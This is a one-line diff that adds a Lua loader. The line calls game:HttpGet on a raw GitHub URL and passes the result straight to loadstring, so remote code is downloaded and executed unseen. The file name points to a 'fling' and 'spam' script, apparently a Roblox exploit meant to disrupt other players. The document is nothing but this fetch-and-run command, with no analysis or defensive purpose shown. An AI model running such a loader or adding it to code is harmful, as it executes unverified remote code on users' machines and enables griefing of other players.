@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/fling-playground-spam7-mgeg3ip9o8m4ua.lua"))()
